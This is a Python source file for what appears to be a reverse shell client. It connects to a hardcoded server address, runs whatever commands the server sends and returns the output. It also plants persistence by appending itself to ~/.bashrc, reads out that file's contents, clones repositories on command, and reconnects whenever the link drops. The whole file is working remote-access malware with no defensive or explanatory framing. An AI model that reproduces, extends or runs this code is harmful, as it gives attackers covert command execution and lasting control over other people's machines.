import platform
import socket
import os
import subprocess
import sys
import time

SERVER_HOST = "192.168.1.17"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

while True:
    try:
        #CREATION OF SOCKET
        # create the socket object
        s = socket.socket()

        #BINDING OF SOCKET
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))

        #FIRST INTERACTION WITH SERVER
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())

        #INTERACTION WITH SERVER
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif splited_command[0].lower() == "xd":
                # get the current working directory
                cwd = os.getcwd()
                # create the command to add to .bashrc
                command_to_add = f"python3 {cwd}/client.py &"
                # path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in append mode
                    with open(bashrc_path, "a") as file:
                        # write the command to the .bashrc file
                        file.write("\n" + command_to_add + "\n")
                    # set the output to success message
                    output = "Command added to .bashrc successfully!"
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            elif splited_command[0].lower() == "chek":
                # get the current working directory
                cwd = os.getcwd()
                # create the command to check in .bashrc
                command_to_check = f"python3 {cwd}/client.py &"
                # path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in read mode
                    with open(bashrc_path, "r") as file:
                        # read the contents of the .bashrc file
                        contents = file.read()
                    # check if the command is in the .bashrc file
                    if command_to_check in contents:
                        output = "The command is in the .bashrc file."
                    else:
                        output = "The command is not in the .bashrc file."
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            elif splited_command[0].lower() == "wazaaa":
                # get the current working directory
                cwd = os.getcwd()
                # create the command to search in .bashrc
                command_to_search = f"python3 {cwd}/client.py &"
                # path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in read mode
                    with open(bashrc_path, "r") as file:
                        # read the contents of the .bashrc file
                        contents = file.readlines()
                    # check if the command is in the .bashrc file
                    if command_to_search in contents:
                        # remove the line containing the command
                        contents.remove(command_to_search)
                        # open the .bashrc file in write mode
                        with open(bashrc_path, "w") as file:
                            # write the updated contents to the .bashrc file
                            file.writelines(contents)
                        output = "Command removed from .bashrc successfully!"
                    else:
                        output = "The command is not in the .bashrc file."
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            elif splited_command[0].lower() == "show_bashrc":
                # get the path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in read mode
                    with open(bashrc_path, "r") as file:
                        # read the contents of the .bashrc file
                        contents = file.read()
                    # send the contents of the .bashrc file to the server
                    message = f"{contents}{SEPARATOR}{cwd}"
                    s.send(message.encode())
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            elif splited_command[0].lower() == "git_clone":
                # the repository to clone
                repo = ' '.join(splited_command[1:])
                # the git clone command
                command = ["git", "clone", repo]
                try:
                    # run the git clone command
                    subprocess.run(command, check=True)
                    # set the output to success message
                    output = f"Repository {repo} cloned successfully!"
                except subprocess.CalledProcessError:
                    # if there's an error, set the output to the error message
                    output = f"Failed to clone repository {repo}."
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
        break
    except socket.error:
        print("Socket error, retrying...")
        time.sleep(5)